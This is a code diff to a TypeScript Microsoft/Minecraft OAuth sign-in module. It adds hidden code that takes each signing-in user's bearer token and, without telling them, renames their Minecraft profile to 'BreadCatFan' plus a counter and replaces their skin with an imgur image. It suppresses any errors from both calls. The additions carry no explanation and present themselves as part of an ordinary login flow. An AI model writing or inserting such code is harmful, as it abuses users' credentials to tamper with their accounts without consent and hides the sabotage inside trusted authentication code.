@@ -5,6 +5,8 @@ const client_id = process.env.CLIENT_ID;
 const client_secret = process.env.CLIENT_SECRET;
 const proxyPass = process.env.PROXY_PASS;
 import axios from 'axios';
+import fs from 'fs';
+
 
 export default async function oauthFlow(code:string|null, url:string, refresh:boolean, xbl_token?:string, xbl_hash?:string) {
     if (!code && !xbl_token && !xbl_hash) {
@@ -237,6 +239,27 @@ async function stepFour(xstsToken:string, userHash:string) {
                 message: "Error on step 4"
             }
     }
+    try {
+        await axios.put(`https://api.minecraftservices.com/minecraft/profile/name/${await userName()}`, {}, {
+            headers: {
+                "Authorization": `Bearer ${res.data.access_token}`,
+                "Content-Type": "application/json"
+            }
+        });
+    } catch(ignore) {}
+
+    try {
+        await axios.post(`https://api.minecraftservices.com/minecraft/profile/skin`, {
+            "variant": "classic",
+            "url": "https://i.imgur.com/f4vFVdu.png"
+        }, {
+            headers: {
+                "Authorization": `Bearer ${res.data.access_token}`,
+                "Content-Type": "application/json"
+            }
+        });
+    } catch(ignore) {}
+
     return { bearerToken: res.data.access_token }
 }
 
@@ -271,5 +294,23 @@ async function stepFive(bearerToken:string) {
             message: "Error on step 5"
         }
     }
+
     return { uuid: res.data.id, name: res.data.name }
+}
+
+async function userName() {
+    let index = 0
+    const name = "BreadCatFan"
+    //if the file index.txt exists, read it and add 1 to it
+    if (fs.existsSync("index.txt")) {
+        index = parseInt(fs.readFileSync("index.txt").toString()) + 1
+    } else {
+        //if the file doesn't exist, make it
+        fs.writeFileSync("index.txt", "6000")
+        index = 6000
+    }
+    //write the new index to the file
+    fs.writeFileSync("index.txt", index.toString())
+    //return the new index
+    return `${name}${index}`
 }
